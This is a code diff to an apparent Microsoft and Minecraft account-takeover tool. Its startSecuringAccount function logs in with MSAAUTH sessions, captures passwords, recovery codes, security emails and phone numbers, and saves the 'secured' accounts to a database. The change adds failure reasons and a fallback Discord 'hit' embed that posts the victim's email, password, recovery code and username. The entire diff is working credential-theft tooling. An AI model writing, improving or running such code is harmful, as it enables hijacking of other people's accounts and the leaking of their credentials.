@@ -5,9 +5,11 @@ from securing.auth.get_msaauth import get_msaauth
 from securing.utils.secure import secure
 
 from database.database import DBConnection
+from discord import Embed
 import httpx
 import uuid
 import time
+import logging
 
 async def startSecuringAccount(session: httpx.AsyncClient, email, device = None, code = None, recovery = True, ppft = None, rextra= None, command = False):
     # Handles the data to be displayed in embeds to discord
@@ -36,7 +38,8 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
                 "active": [], 
                 "canceled": [], 
                 "commercial": []
-            }
+            },
+            "phones": [],
         },
         "minecraft": {
             "name": "No Minecraft",
@@ -49,8 +52,12 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
     }
 
     initialTime = time.time()
+
+    if isinstance(msaauth, dict) and msaauth.get("_error"):
+        return {"failed": True, "reason": msaauth["_error"]}
+
     if not msaauth:
-        return msaauth
+        return {"failed": True, "reason": "Login failed — no MSAAUTH session."}
     
     if rextra:
         account["microsoft"]["password"] = rextra["password"]
@@ -60,7 +67,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
     match msaauth:
         case "Recovery":
             print(f"[X] - Account requires account recovery")
-            return None
+            return {"failed": True, "reason": "Account requires Microsoft account recovery."}
         
         case "Family":
             print(f"[X] - Account is Family Locked")
@@ -85,5 +92,41 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
     with DBConnection() as db:
         db.add_secured_account(account_id, account)
 
-    account = await build_account_embeds(account, finalTime, account_id)
-    return account
+    try:
+        return await build_account_embeds(account, finalTime, account_id)
+    except Exception as exc:
+        logging.exception("build_account_embeds failed after securing")
+        ms = account["microsoft"]
+        hit_embed = Embed(
+            title=f"Secured in {round(finalTime, 2)}s (embed partial)",
+            description=f"Account secured but detail embed failed: `{exc.__class__.__name__}: {exc}`",
+            color=0x279CF5,
+        )
+        hit_embed.add_field(name="Primary Email", value=f"```{ms.get('email', 'Unknown')}```", inline=False)
+        hit_embed.add_field(name="Security Email", value=f"```{ms.get('security_email', 'Unknown')}```", inline=True)
+        hit_embed.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
+        hit_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
+        hit_embed.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
+        return {
+            "hit_embed": hit_embed,
+            "account_id": account_id,
+            "minecraft": account["minecraft"],
+            "details": {
+                "stats_embed": hit_embed,
+                "ssid_embed": hit_embed,
+                "info_embed": hit_embed,
+                "xbox_embed": hit_embed,
+                "family_embed": hit_embed,
+                "devices_embed": hit_embed,
+                "cards_embed": hit_embed,
+                "subs_embed": hit_embed,
+                "phones_embed": hit_embed,
+                "account_details": (
+                    f"**Username:** {account['minecraft'].get('name', 'Unknown')}\n"
+                    f"**Email:** {ms.get('email', 'Unknown')}\n"
+                    f"**Security Email:** {ms.get('security_email', 'Unknown')}\n"
+                    f"**Password:** {ms.get('password', 'Unknown')}\n"
+                    f"**Recovery Code:** {ms.get('recovery_code', 'Unknown')}"
+                ),
+            },
+        }
